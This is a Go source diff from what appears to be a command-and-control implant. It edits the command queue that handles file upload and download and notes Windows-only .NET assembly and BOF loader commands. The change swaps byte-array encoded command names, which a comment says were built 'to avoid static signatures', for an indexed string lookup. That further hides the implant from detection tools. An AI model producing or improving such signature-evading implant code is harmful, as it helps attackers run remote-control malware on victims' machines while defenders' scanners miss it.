@@ -11,14 +11,8 @@ import (
 	"time"
 )
 
-// Command processor strings (constructed to avoid static signatures)
 // NOTE: inline-assembly and bof commands are Windows-only (.NET CLR / BOF loader)
 // They are not supported on Linux/Darwin builds
-var (
-	// Command names (Linux-supported only)
-	cpCmdUpload   = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})   // upload
-	cpCmdDownload = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64}) // download
-)
 
 // ProcessNextCommand processes the next command in the queue
 func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
@@ -50,7 +44,7 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	// They are not supported on Linux/Darwin builds - no handlers registered
 
 	// Handle upload chunks
-	if cmd.Command == cpCmdUpload && cmd.Data != "" {
+	if cmd.Command == getCqStr(idxCqCmdUpload) && cmd.Data != "" {
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &CommandResult{
@@ -114,10 +108,10 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	var args []string
 	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))
 
-	if strings.HasPrefix(cmdLower, cpCmdDownload) {
+	if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdDownload)) {
 		// Use special parsing for download that treats everything after "download" as one argument
 		args = parseDownloadCommand(cmd.Command)
-	} else if strings.HasPrefix(cmdLower, cpCmdUpload) {
+	} else if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdUpload)) {
 		// Use special parsing for upload that treats everything after "upload" as one argument
 		args = parseUploadCommand(cmd.Command)
 	} else {
